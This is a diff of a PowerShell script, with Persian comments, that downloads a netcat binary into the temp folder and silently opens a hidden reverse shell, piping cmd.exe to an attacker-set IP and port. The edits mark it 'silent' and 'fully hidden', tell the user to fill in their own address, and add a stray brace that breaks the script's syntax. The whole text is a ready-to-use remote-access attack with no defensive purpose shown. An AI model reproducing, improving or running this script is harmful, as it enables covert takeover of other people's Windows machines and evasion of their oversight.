@@ -1,30 +1,31 @@
 # 1. Enable TLS 1.2 for secure download
-[Net.ServicePointManager]::SecurityProtocol = 'Tls12'
+[Net.ServicePointManager]::SecurityProtocol = "Tls12"
 
 # 2. Auto-detect OS architecture (32-bit or 64-bit)
 $is64bit = [Environment]::Is64BitOperatingSystem
-$ncUrl = if ($is64bit) {
+$ncurl = if ($is64bit) {
     "https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86_64/nc.exe"
 } else {
+    {
     "https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/nc.exe"
 }
 
 # 3. Configuration
-$ncPath     = "$env:TEMP\nc.exe"
-$attackerIP = "192.168.1.100"
-$port       = "443"
+$ncPath      = "$env:TEMP\nc.exe"
+$attackerIP  = "192.168.1.100"   # ←←←←← اینجا آی‌پی خودت رو بگذار
+$port        = "443"            # ←←←← پورت دلخواهت (مثلاً 443 یا 4444)
 
-# 4. Download nc.exe (smart)
+# 4. Download nc.exe (smart + silent)
 try {
-    Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
+    Invoke-WebRequest -Uri $ncurl -OutFile $ncPath -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
 } catch {
     Write-Error "Download failed: $($_.Exception.Message)"
     exit 1
 }
 
-# 5. Execute reverse shell (hidden)
+# 5. Execute reverse shell (fully hidden)
 if (Test-Path $ncPath) {
-    $args = "$attackerIP $port -e cmd.exe"
+    $args = "-e cmd.exe $attackerIP $port"
     Start-Process -FilePath $ncPath -ArgumentList $args -WindowStyle Hidden -NoNewWindow
 }
 
